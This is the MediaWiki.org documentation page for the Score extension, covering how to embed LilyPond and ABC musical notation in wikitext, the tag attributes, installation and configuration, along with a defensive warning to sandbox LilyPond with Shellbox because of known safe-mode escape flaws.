* [Log in](/w/index.php?title=Special:UserLogin&returnto=Extension%3AScore "You are encouraged to log in; however, it is not mandatory [o]")

Pages for logged out editors [learn more](/wiki/Help%3AIntroduction)

* [Contributions](/wiki/Special%3AMyContributions "A list of edits made from this IP address [y]")
* [Talk](/wiki/Special%3AMyTalk "Discussion about edits from this IP address [n]")

## Contents

move to sidebar
hide

* Beginning
* [1
  Acknowledgements](#Acknowledgements)
* [2
  Usage](#Usage)

  Toggle Usage subsection
  + [2.1
    The LilyPond language](#The_LilyPond_language)
* [3
  Prerequisites](#Prerequisites)
* [4
  Security concerns](#Security_concerns)
* [5
  Installation](#Installation)

  Toggle Installation subsection
  + [5.1
    Configuration](#Configuration)
    - [5.1.1
      $wgScoreLilyPond](#$wgScoreLilyPond)
    - [5.1.2
      $wgScoreTrim](#$wgScoreTrim)
    - [5.1.3
      $wgScoreAbc2Ly](#$wgScoreAbc2Ly)
    - [5.1.4
      $wgScoreFluidsynth](#$wgScoreFluidsynth)
    - [5.1.5
      $wgScoreSoundfont](#$wgScoreSoundfont)
    - [5.1.6
      $wgScoreLame](#$wgScoreLame)
  + [5.2
    Remarks](#Remarks)
* [6
  Finding scores](#Finding_scores)
* [7
  See also](#See_also)

Toggle the table of contents

# Extension:Score

[Issue tracker](/wiki/Special%3AMyLanguage/Phabricator "Special:MyLanguage/Phabricator"): [**#MediaWiki-extensions-Score**](https://phabricator.wikimedia.org/tag/mediawiki-extensions-score/ "phab:tag/mediawiki-extensions-score/")

* [Extension](/wiki/Extension%3AScore "View the subject page [c]")
* [Discussion](/wiki/Extension_talk%3AScore "Discussion about the content page [t]")

English

* [Read](/wiki/Extension%3AScore)
* [Edit](/w/index.php?title=Extension:Score&action=edit "Edit the source code of this page [e]")
* [View history](/w/index.php?title=Extension:Score&action=history "Past revisions of this page [h]")

Tools

Tools
move to sidebar
hide

Actions

* [Read](/wiki/Extension%3AScore)
* [Edit](/w/index.php?title=Extension:Score&action=edit "Edit the source code of this page [e]")
* [View history](/w/index.php?title=Extension:Score&action=history)

General

* [What links here](/wiki/Special%3AWhatLinksHere/Extension%3AScore "A list of all wiki pages that link here [j]")
* [Related changes](/wiki/Special%3ARecentChangesLinked/Extension%3AScore "Recent changes in pages linked from this page [k]")
* [Upload file](//commons.wikimedia.org/wiki/Special%3AUploadWizard "Upload files [u]")
* [Special pages](/wiki/Special%3ASpecialPages "A list of all special pages [q]")
* [Permanent link](/w/index.php?title=Extension:Score&oldid=6668607 "Permanent link to this revision of this page")
* [Page information](/w/index.php?title=Extension:Score&action=info "More information about this page")
* [Cite this page](/w/index.php?title=Special:CiteThisPage&page=Extension%3AScore&id=6668607&wpFormIdentifier=titleform "Information on how to cite this page")
* [Get shortened URL](/w/index.php?title=Special:UrlShortener&url=https%3A%2F%2Fwww.mediawiki.org%2Fwiki%2FExtension%3AScore)
* [Download QR code](/w/index.php?title=Special:QrCode&url=https%3A%2F%2Fwww.mediawiki.org%2Fwiki%2FExtension%3AScore)

Print/export

* [Create a book](/w/index.php?title=Special:Book&bookcmd=book_creator&referer=Extension%3AScore)
* [Download as PDF](/w/index.php?title=Special:DownloadAsPdf&page=Extension%3AScore&action=show-download-screen)
* [Printable version](/w/index.php?title=Extension:Score&printable=yes "Printable version of this page [p]")

In other projects

* [Wikimedia Commons](https://commons.wikimedia.org/wiki/Category%3AMediaWiki_extension_Score)
* [Wikidata item](https://www.wikidata.org/wiki/Special%3AEntityPage/Q21678392 "Link to connected data repository item [g]")

Appearance
move to sidebar
hide

From mediawiki.org

[Translate this page](/w/index.php?title=Special:Translate&group=page-Extension%3AScore&action=page&filter=&action_source=translate_page "Special:Translate")Languages:

* [Deutsch](/wiki/Extension%3AScore/de "Erweiterung:Score (16% translated)")
* English
* [Tiếng Việt](/wiki/Extension%3AScore/vi "Tiện ích mở rộng:Score (100% translated)")
* [Türkçe](/wiki/Extension%3AScore/tr "Extension:Score (93% translated)")
* [Yorùbá](/wiki/Extension%3AScore/yo "Extension:Score/yo (4% translated)")
* [español](/wiki/Extension%3AScore/es "Extensión:Score (20% translated)")
* [français](/wiki/Extension%3AScore/fr "Extension:Score (100% translated)")
* [italiano](/wiki/Extension%3AScore/it "Estensione:Score (67% translated)")
* [polski](/wiki/Extension%3AScore/pl "Rozszerzenie:Score (17% translated)")
* [português](/wiki/Extension%3AScore/pt "Extensão:Score (29% translated)")
* [português do Brasil](/wiki/Extension%3AScore/pt-br "Extensão:Partitura (100% translated)")
* [svenska](/wiki/Extension%3AScore/sv "Tillägg:Score (100% translated)")
* [čeština](/wiki/Extension%3AScore/cs "Rozšíření:Score (7% translated)")
* [русский](/wiki/Extension%3AScore/ru "Расширение:Score (15% translated)")
* [українська](/wiki/Extension%3AScore/uk "Розширення:Score (33% translated)")
* [हिन्दी](/wiki/Extension%3AScore/hi "एक्सटेंशन:Score (100% translated)")
* [বাংলা](/wiki/Extension%3AScore/bn "Extension:Score/bn (5% translated)")
* [中文](/wiki/Extension%3AScore/zh "Extension: (23% translated)")
* [日本語](/wiki/Extension%3AScore/ja "Extension:Score (100% translated)")
* [한국어](/wiki/Extension%3AScore/ko "Extension:Score (13% translated)")

|  | The Score extension requires setting up an external service, [Shellbox](/wiki/Special%3AMyLanguage/Shellbox "Special:MyLanguage/Shellbox"), to securely process musical scores via LilyPond. Please review the information in [#Security concerns](#Security_concerns) and the [2021 security advisory](/wiki/Special%3AMyLanguage/Extension%3AScore/2021_security_advisory "Special:MyLanguage/Extension:Score/2021 security advisory") before installing this extension. |
| --- | --- |

**[MediaWiki extensions manual](/wiki/Special%3AMyLanguage/Manual%3AExtensions "Special:MyLanguage/Manual:Extensions")**
| Score [Release status:](/wiki/Special%3AMyLanguage/Extension_status "Special:MyLanguage/Extension status") stable | |
| --- | --- |
|  | |
| **[Implementation](/wiki/Special%3AMyLanguage/Template%3AExtension#type "Special:MyLanguage/Template:Extension")** | [Tag](/wiki/Special%3AMyLanguage/Manual%3ATag_extensions "Special:MyLanguage/Manual:Tag extensions") |
| **[Description](/wiki/Special%3AMyLanguage/Template%3AExtension#description "Special:MyLanguage/Template:Extension")** | Allows rendering of musical scores with [LilyPond](https://en.wikipedia.org/wiki/LilyPond "w:LilyPond") |
| **[Author(s)](/wiki/Special%3AMyLanguage/Template%3AExtension#username "Special:MyLanguage/Template:Extension")** | [Alexander Klauer](/wiki/User%3AGrafZahl "User:GrafZahl"), [Étienne Beaulé](/wiki/User%3AEbe123 "User:Ebe123") |
| **[Latest version](/wiki/Special%3AMyLanguage/Template%3AExtension#version "Special:MyLanguage/Template:Extension")** | 0.3.0 (2019-03-23) |
| [**MediaWiki**](/wiki/Special%3AMyLanguage/Template%3AExtension#mediawiki "Special:MyLanguage/Template:Extension") | 1.36+ |
| [**PHP**](/wiki/Special%3AMyLanguage/Template%3AExtension#php "Special:MyLanguage/Template:Extension") | 5.3+ |
| **[License](/wiki/Special%3AMyLanguage/Template%3AExtension#license "Special:MyLanguage/Template:Extension")** | [GNU General Public License 3.0 or later](//www.gnu.org/licenses/gpl-3.0-standalone.html) |
| **Download** | [**Download extension**](/wiki/Special%3AExtensionDistributor/Score "Special:ExtensionDistributor/Score") Git [[?](/wiki/Special%3AMyLanguage/Download_from_Git "Special:MyLanguage/Download from Git")]:  * [Download Git master](https://github.com/wikimedia/mediawiki-extensions-Score/archive/master.tar.gz) * [browse repository](https://gerrit.wikimedia.org/g/mediawiki/extensions/Score "git:mediawiki/extensions/Score") ([Phabricator](https://phabricator.wikimedia.org/diffusion/ESCR "phab:diffusion/ESCR") · [GitHub](https://github.com/wikimedia/mediawiki-extensions-Score)) * [commit history](https://gerrit.wikimedia.org/g/mediawiki/extensions/Score/%2Blog/master "git:mediawiki/extensions/Score/+log/master") * [repository contributors (GitHub)](https://github.com/wikimedia/mediawiki-extensions-Score/graphs/contributors) * [code review](https://gerrit.wikimedia.org/r/q/project%3Amediawiki/extensions/Score "gerrit:q/project:mediawiki/extensions/Score") [README.md](https://gerrit.wikimedia.org/g/mediawiki/extensions/Score/%2B/HEAD/README.md "git:mediawiki/extensions/Score/+/HEAD/README.md") |
| [Parameters](/wiki/Special%3AMyLanguage/Template%3AExtension#parameters "Special:MyLanguage/Template:Extension")  * $wgScorePath * $wgScoreAbc2Ly * $wgScoreFluidsynth * $wgScoreLame * $wgScoreEnvironment * $wgScoreLilyPond * $wgWikibaseMusicalNotationLineWidthInches * $wgScoreImageMagickConvert * $wgScoreLilyPondFakeVersion * $wgScoreFileBackend * $wgScoreDirectory * $wgScoreTrim * $wgScoreGhostscript * $wgMusicalNotationEnableWikibaseDataType * $wgScoreOfferSourceDownload * $wgScoreMaxLength * $wgScoreDebugOutput * $wgScoreUseSvg * $wgScoreDisableExec * $wgScoreSafeMode * $wgScoreSoundfont | |
| [Tags](/wiki/Special%3AMyLanguage/Template%3AExtension#tags "Special:MyLanguage/Template:Extension") score | |
| [Hooks used](/wiki/Special%3AMyLanguage/Template%3AExtension#hook "Special:MyLanguage/Template:Extension")  * [ParserFirstCallInit](/wiki/Special%3AMyLanguage/Manual%3AHooks/ParserFirstCallInit "Special:MyLanguage/Manual:Hooks/ParserFirstCallInit") * [SoftwareInfo](/wiki/Special%3AMyLanguage/Manual%3AHooks/SoftwareInfo "Special:MyLanguage/Manual:Hooks/SoftwareInfo") * [WikibaseClientDataTypes](/wiki/Special%3AMyLanguage/Manual%3AHooks/WikibaseClientDataTypes "Special:MyLanguage/Manual:Hooks/WikibaseClientDataTypes") * [WikibaseRepoDataTypes](/wiki/Special%3AMyLanguage/Manual%3AHooks/WikibaseRepoDataTypes "Special:MyLanguage/Manual:Hooks/WikibaseRepoDataTypes") | |
| **Quarterly downloads** | 14 (Ranked 117th) |
| [**Public wikis using**](https://wikiapiary.com/wiki/Extension%3AScore) | 918 (Ranked 265th) |
| [Translate the Score extension](https://translatewiki.net/wiki/Special%3ATranslate/ext-score "translatewiki:Special:Translate/ext-score") if it is available at translatewiki.net | |
|
| **[Issues](/wiki/Special%3AMyLanguage/Phabricator "Special:MyLanguage/Phabricator")** | [Open tasks](https://phabricator.wikimedia.org/tag/mediawiki-extensions-score "phab:tag/mediawiki-extensions-score") · [Report a bug](https://phabricator.wikimedia.org/maniphest/task/create/?projects=MediaWiki-extensions-Score) |

The **Score** extension allows the rendering of musical scores as [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics "w:Portable Network Graphics") images using [LilyPond](https://en.wikipedia.org/wiki/LilyPond "w:LilyPond") and can also transform them into audio and MIDI files.

## Acknowledgements

[[edit](/w/index.php?title=Extension:Score&action=edit&section=1 "Edit section: Acknowledgements")]

* The original [Extension:LilyPond](/wiki/Special%3AMyLanguage/Extension%3ALilyPond "Special:MyLanguage/Extension:LilyPond") was written by Johannes E. Schindelin.
* This extension is based on a [code review](https://www.mediawiki.org/wiki/Special%3ACode/MediaWiki/98414#c27299 "rev:98414") of [Extension:LilyPond](/wiki/Special%3AMyLanguage/Extension%3ALilyPond "Special:MyLanguage/Extension:LilyPond") by Tim Starling.
* The original [Extension:ABC](/wiki/Special%3AMyLanguage/Extension%3AABC "Special:MyLanguage/Extension:ABC") was written by River Tarnell.

## Usage

[[edit](/w/index.php?title=Extension:Score&action=edit&section=2 "Edit section: Usage")]

After [setup](#Installation), you can embed simple [LilyPond notation](http://lilypond.org/doc/Documentation/learning-big-page#common-notation) into your wikitext inside a `‎<score>...‎</score>` tag. For example:

```
<score>\relative c' { f d f a d f e d cis a cis e a g f e }</score>

```

yields:

![\relative c' { f d f a d f e d cis a cis e a g f e }](//upload.wikimedia.org/score/t/5/t58azavwnmbyaxrthg8ryw0ro3h21kk/t58azavw.png)

You may also specify attributes to the score tags in the general form

```
<score attribute1="value1" attribute2="value2">…</score>.

```

For example:

```
<score sound="1">\relative c' { \set Staff.midiInstrument = "tenor sax" f d f a d f e d cis a cis e a g f e }</score>

```

yields:

![

\relative c' { \set Staff.midiInstrument = "tenor sax" f d f a d f e d cis a cis e a g f e }](//upload.wikimedia.org/score/h/2/h2vislbfdebfthd995sd8zedzhkgjo0/h2vislbf.png)Audio playback is not supported in your browser. You can [download the audio file](//upload.wikimedia.org/score/h/2/h2vislbfdebfthd995sd8zedzhkgjo0/h2vislbf.mp3).

The following attributes are available:

| Attribute | Allowed values | Effect |
| --- | --- | --- |
| lang | ABC, lilypond *(default)* | Sets the score language. For example, to provide a score in [ABC notation](https://en.wikipedia.org/wiki/ABC_notation "w:ABC notation"), you might use:  ``` <score lang="ABC"> X:1 M:C L:1/4 K:C C, D, E, F,|G, A, B, C|D E F G|A B c d| e f g a|b c' d' e'|f' g' a' b'|] </score>  ``` |
| midi |  | (removed) This used to control whether the rendered score image linked to a MIDI file. |
| override\_midi | Known file name, that is, if *override\_midi="name"* is given, `[[File:name]]` does not yield a red link | (deprecated) Instead you can add a `[[File:superior midi filename.mid]]` wikilink after the closing `‎</score>` tag.Uses the specified MIDI file instead of generating one with LilyPond. Use this attribute together with the midi attribute (see before) or the sound attribute (see later). This attribute is useful if you already have a MIDI file whose quality is superior to what would be generated by LilyPond. |
| override\_audio | Known file name, that is, if *override\_audio="name"* is given, `[[File:Name]]` does not yield a red link | (deprecated) Instead you can add a `[[File:superior audio filename.oga]]` wikilink after the closing `‎</score>` tag.Embeds the media specified by the file name in the [HTML](https://en.wikipedia.org/wiki/HTML "w:HTML") after the score image(s). This is an alternative to the sound attribute (see further). It can, for example, be useful if you have a suitable audio file of superior quality compared with the auto-generated audio file. Of course, you can still omit both attributes in this case and add the file manually to the page, if you prefer. |
| override\_ogg |  | (deprecated) Doubly-deprecated alias for *override\_audio*. |
| raw | 0 *(default)*, 1 | If set to 1, the score code is interpreted as a complete LilyPond file. Use this option if you want to create more complex scores. If the score language (lang attribute) is not set to lilypond, this attribute is ignored. By default (when *raw=0*), provided code is wrapped in a `\score{...}` block, along with default `\layout{...}` and `\midi{...}` blocks, if not already provided. |
| sound | 0 *(default)*, 1 | If set to 1, an audio file will be generated for the score, provided you installed and configured [Extension:TimedMediaHandler](/wiki/Special%3AMyLanguage/Extension%3ATimedMediaHandler "Special:MyLanguage/Extension:TimedMediaHandler"). An audio player will be embedded in the HTML after the score image(s). |
| vorbis | 0 *(default)*, 1 | (deprecated) Alias for *sound*. |

### The LilyPond language

[[edit](/w/index.php?title=Extension:Score&action=edit&section=3 "Edit section: The LilyPond language")]

Lyrics may be added like this:

```
<score>
\relative c'' { \time 4/4 \key c \major
c4 g8 g a4 g r b^> c^> r \bar "|." }
\addlyrics { Shave and a hair -- cut: two bits. }
</score>

```

![\relative c'' { \time 4/4 \key c \major
  c4 g8 g a4 g r b^> c^> r \bar "|." }
  \addlyrics { Shave and a hair -- cut: two bits. }](//upload.wikimedia.org/score/t/0/t0u3gkn5otxjfuk9vvci3oyub7otjcy/t0u3gkn5.png)Audio playback is not supported in your browser. You can [download the audio file](//upload.wikimedia.org/score/t/0/t0u3gkn5otxjfuk9vvci3oyub7otjcy/t0u3gkn5.mp3).

For advanced users, the [`\set Staff.midiInstrument`](http://lilypond.org/doc/Documentation/notation/using-midi-instruments) command can be used to change the MIDI instrument for the sound.

## Prerequisites

[[edit](/w/index.php?title=Extension:Score&action=edit&section=4 "Edit section: Prerequisites")]

The following packages are recommended:

* LilyPond
* Ghostscript
* ImageMagick
* FluidSynth
* Firejail

This extension uses LilyPond to render score images, so you need a working LilyPond installation ([Special:Version](/wiki/Special%3AVersion "Special:Version") displays the LilyPond version).
If you install LilyPond from a package, Ghostscript will also be installed, since LilyPond depends on Ghostscript.
ImageMagick should be installed to trim the images, otherwise they will contain an excessive amount of whitespace.

For security reasons, it is highly recommended to install [firejail](/wiki/Special%3AMyLanguage/Manual%3AShell_framework#Restrictions "Special:MyLanguage/Manual:Shell framework") to further restrict what LilyPond and Ghostscript can do if untrusted users are allowed to edit your wiki.

The extension is also capable of creating audio files from the MIDI files generated by LilyPond. If you want to make use of this functionality, you need to have [Extension:TimedMediaHandler](/wiki/Special%3AMyLanguage/Extension%3ATimedMediaHandler "Special:MyLanguage/Extension:TimedMediaHandler") installed.

FluidSynth is the preferred method to convert MIDI files to audio files, however TiMidity++ is also supported.

## Security concerns

[[edit](/w/index.php?title=Extension:Score&action=edit&section=5 "Edit section: Security concerns")]
[![](//upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Shellbox_with_music_notes.png/220px-Shellbox_with_music_notes.png)](/wiki/File%3AShellbox_with_music_notes.png)

Use Shellbox to secure LilyPond to protect your wiki!

Score uses LilyPond in safe mode, however there are known unfixed safe mode escape vulnerabilities leading to arbitrary execution.

If you don't absolutely trust everyone who has editing privileges on your wiki, it is strongly recommended to set up containment of lilypond using [Shellbox](/wiki/Special%3AMyLanguage/Shellbox "Special:MyLanguage/Shellbox").
See [Shellbox#Server setup](/wiki/Special%3AMyLanguage/Shellbox#Server_setup "Special:MyLanguage/Shellbox") for details on how to set up the contained server, and below for configuring MediaWiki to use it.
Also, ensure you're using a recent version of LilyPond (2.22.0+) or a distribution package (e.g. from Debian) that has security fixes.
Keep safe mode enabled, even with containment as an extra layer of defense. Certain functionality will not work in safe mode, the fix for that is to modify LilyPond to allow that functionality in safe mode.

## Installation

[[edit](/w/index.php?title=Extension:Score&action=edit&section=6 "Edit section: Installation")]
*See the extension's `README.md` for detailed installation instructions.*

* [Download](/wiki/Special%3AExtensionDistributor/Score "Special:ExtensionDistributor/Score") and move the extracted `Score` folder to your `extensions/` directory.
  Developers and code contributors should install the extension [from Git](/wiki/Special%3AMyLanguage/Download_from_Git "Special:MyLanguage/Download from Git") instead, using:`cd extensions/
  git clone https://gerrit.wikimedia.org/r/mediawiki/extensions/Score`
* Add the following code at the bottom of your [LocalSettings.php](/wiki/Special%3AMyLanguage/Manual%3ALocalSettings.php "Special:MyLanguage/Manual:LocalSettings.php") file:
  ```
  wfLoadExtension( 'Score' );
  $wgScoreTrim = true;
  $wgImageMagickConvertCommand = '/usr/bin/convert';
  $wgShellboxUrl = '... address to Shellbox ...';
  $wgShellboxSecretKey = '... your secret key ...';

  ```
* Create a subdirectory named `lilypond` in your [$wgUploadDirectory](/wiki/Special%3AMyLanguage/Manual%3A%24wgUploadDirectory "Special:MyLanguage/Manual:$wgUploadDirectory") (usually the directory named `images` in your MediaWiki directory). Make sure the directory is writable by your Web server.
* ![Yes](//upload.wikimedia.org/wikipedia/commons/thumb/f/f6/OOjs_UI_icon_check-constructive.svg/15px-OOjs_UI_icon_check-constructive.svg.png) **Done** – Navigate to [Special:Version](/wiki/Special%3AVersion "Special:Version") on your wiki to verify that the extension is successfully installed.

### Configuration

[[edit](/w/index.php?title=Extension:Score&action=edit&section=7 "Edit section: Configuration")]

Here are some of the extension's global configuration parameters.

#### $wgScoreLilyPond

[[edit](/w/index.php?title=Extension:Score&action=edit&section=8 "Edit section: $wgScoreLilyPond")]

Set `$wgScoreLilyPond` to the path to your LilyPond executable (typically `/usr/bin/lilypond` or `/usr/local/bin/lilypond`).

#### $wgScoreTrim

[[edit](/w/index.php?title=Extension:Score&action=edit&section=9 "Edit section: $wgScoreTrim")]

The `$wgScoreTrim` is a boolean which defaults to the value of `$wgUseImageMagick`. If `true`, the resulting score PNG images are trimmed with ImageMagick. If you don't want trimming, or don't want to install ImageMagick, set `$wgScoreTrim` to `false`.

#### $wgScoreAbc2Ly

[[edit](/w/index.php?title=Extension:Score&action=edit&section=10 "Edit section: $wgScoreAbc2Ly")]

Set `$wgScoreAbc2Ly` to the path of your ABC to LilyPond converter executable (typically `/usr/bin/abc2ly` or `/usr/local/bin/abc2ly`).

#### $wgScoreFluidsynth

[[edit](/w/index.php?title=Extension:Score&action=edit&section=11 "Edit section: $wgScoreFluidsynth")]

Set `$wgScoreFluidsynth` to the path of your [Fluidsynth](https://en.wikipedia.org/wiki/Fluidsynth "w:Fluidsynth") executable (typically `/usr/bin/fluidsynth` or `/usr/local/bin/fluidsynth`).

#### $wgScoreSoundfont

[[edit](/w/index.php?title=Extension:Score&action=edit&section=12 "Edit section: $wgScoreSoundfont")]

Set `$wgScoreSoundfont` to the path of your [soundfont](https://en.wikipedia.org/wiki/Soundfont "w:Soundfont") file (typically `/usr/share/sounds/sf2/FluidR3_GM.sf2` or `/usr/share/sounds/sf2/FluidR3_GS.sf2`).

#### $wgScoreLame

[[edit](/w/index.php?title=Extension:Score&action=edit&section=13 "Edit section: $wgScoreLame")]

Set `$wgScoreLame` to the path of your [Lame](https://en.wikipedia.org/wiki/LAME "w:LAME") executable (typically `/usr/bin/lame` or `/usr/local/bin/lame`). Required if the generated audio file should be a MP3.

### Remarks

[[edit](/w/index.php?title=Extension:Score&action=edit&section=14 "Edit section: Remarks")]

This extension runs various binaries in a [Shellbox](/wiki/Shellbox "Shellbox") to provide some security. You may have to increase [$wgMaxShellMemory](/wiki/Special%3AMyLanguage/Manual%3A%24wgMaxShellMemory "Special:MyLanguage/Manual:$wgMaxShellMemory") if you get "out of memory" errors.

## Finding scores

[[edit](/w/index.php?title=Extension:Score&action=edit&section=15 "Edit section: Finding scores")]

Pages containing `‎<score>` tags are in the [tracking category](/wiki/Special%3AMyLanguage/tracking_category "Special:MyLanguage/tracking category") with message name 'score-use-category'.
Visit [Special:TrackingCategories](/wiki/Special%3ATrackingCategories "Special:TrackingCategories") to find the localized title of this category on your wiki and show the pages in it, for example [w:Category:Pages using the Score extension](https://en.wikipedia.org/wiki/Category%3APages_using_the_Score_extension "w:Category:Pages using the Score extension") on the English Wikipedia.

## See also

[[edit](/w/index.php?title=Extension:Score&action=edit&section=16 "Edit section: See also")]

* [Help:Score](https://en.wikipedia.org/wiki/Help%3AScore "w:Help:Score") on English Wikipedia and [Help:Sheet music](https://en.wikisource.org/wiki/Help%3ASheet_music "s:Help:Sheet music") on Wikisource have more examples of LilyPond syntax.
* [LilyPond notation](http://lilypond.org/doc/v2.14/Documentation/learning-big-page#common-notation)
* [ABC notation](http://www.lesession.co.uk/abc/abc_notation.htm)

|  | This extension is being used on one or more [Wikimedia projects](https://meta.wikimedia.org/wiki/Special%3AMyLanguage/Wikimedia_projects "m:Special:MyLanguage/Wikimedia projects"). This probably means that the extension is stable and works well enough to be used by such high-traffic websites. Look for this extension's name in Wikimedia's [CommonSettings.php](https://noc.wikimedia.org/conf/highlight.php?file=CommonSettings.php) and [InitialiseSettings.php](https://noc.wikimedia.org/conf/highlight.php?file=InitialiseSettings.php) configuration files to see where it's installed. A full list of the extensions installed on a particular wiki can be seen on the wiki's [Special:Version](/wiki/Special%3AVersion "Special:Version") page. |
| --- | --- |

|  | This extension is included in the following wiki farms/hosts and/or packages:   * [Miraheze](/wiki/Special%3AMyLanguage/Miraheze "Special:MyLanguage/Miraheze") * [WikiForge](https://wikiforge.net/)  This is not an authoritative list. Some wiki farms/hosts and/or packages may contain this extension even if they are not listed here. Always check with your wiki farms/hosts or bundle to confirm. |
| --- | --- |

![](https://login.wikimedia.org/wiki/Special:CentralAutoLogin/start?useformat=desktop&type=1x1&usesul3=0)
Retrieved from "<https://www.mediawiki.org/w/index.php?title=Extension:Score&oldid=6668607>"
[Categories](/wiki/Special%3ACategories "Special:Categories"):

* [Stable extensions](/wiki/Category%3AStable_extensions "Category:Stable extensions")
* [Tag extensions](/wiki/Category%3ATag_extensions "Category:Tag extensions")
* [GPL licensed extensions](/wiki/Category%3AGPL_licensed_extensions "Category:GPL licensed extensions")
* [Extensions in Wikimedia version control](/wiki/Category%3AExtensions_in_Wikimedia_version_control "Category:Extensions in Wikimedia version control")
* [ParserFirstCallInit extensions](/wiki/Category%3AParserFirstCallInit_extensions "Category:ParserFirstCallInit extensions")
* [SoftwareInfo extensions](/wiki/Category%3ASoftwareInfo_extensions "Category:SoftwareInfo extensions")
* [WikibaseClientDataTypes extensions](/wiki/Category%3AWikibaseClientDataTypes_extensions "Category:WikibaseClientDataTypes extensions")
* [WikibaseRepoDataTypes extensions](/wiki/Category%3AWikibaseRepoDataTypes_extensions "Category:WikibaseRepoDataTypes extensions")
* [All extensions](/wiki/Category%3AAll_extensions "Category:All extensions")
* [Extensions used on Wikimedia](/wiki/Category%3AExtensions_used_on_Wikimedia "Category:Extensions used on Wikimedia")
* [Extensions included in Miraheze](/wiki/Category%3AExtensions_included_in_Miraheze "Category:Extensions included in Miraheze")
* [Extensions included in WikiForge](/wiki/Category%3AExtensions_included_in_WikiForge "Category:Extensions included in WikiForge")
* [Music editor extensions](/wiki/Category%3AMusic_editor_extensions "Category:Music editor extensions")
* [Extensions with VisualEditor support](/wiki/Category%3AExtensions_with_VisualEditor_support "Category:Extensions with VisualEditor support")
Hidden categories:

* [Pages using the Score extension](/wiki/Category%3APages_using_the_Score_extension "Category:Pages using the Score extension")
* [Extensions without a compatibility policy](/wiki/Category%3AExtensions_without_a_compatibility_policy "Category:Extensions without a compatibility policy")
* [Extensions with manual MediaWiki version](/wiki/Category%3AExtensions_with_manual_MediaWiki_version "Category:Extensions with manual MediaWiki version")

* This page was last edited on 25 July 2024, at 21:11.
* Text is available under the [Creative Commons Attribution-ShareAlike License](https://creativecommons.org/licenses/by-sa/4.0/); additional terms may apply. Text in [the Help: namespace](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Help%3AContents) is available under the [Creative Commons CC0 License](https://creativecommons.org/publicdomain/zero/1.0/).
  By using this site, you agree to the [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use) and [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy).

* [Privacy policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy)
* [About mediawiki.org](/wiki/Project%3AAbout)
* [Disclaimers](/wiki/Project%3AGeneral_disclaimer)
* [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct)
* [Developers](https://developer.wikimedia.org)
* [Statistics](https://stats.wikimedia.org/#/www.mediawiki.org)
* [Cookie statement](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ACookie_statement)
* [Mobile view](//m.mediawiki.org/w/index.php?title=Extension:Score&mobileaction=toggle_view_mobile)

* [![Wikimedia Foundation](/static/images/footer/wikimedia-button.svg)](https://wikimediafoundation.org/)
* [![Powered by MediaWiki](/w/resources/assets/poweredby_mediawiki.svg)](https://www.mediawiki.org/)

Search

Search

Toggle the table of contents

Extension:Score

Add topic


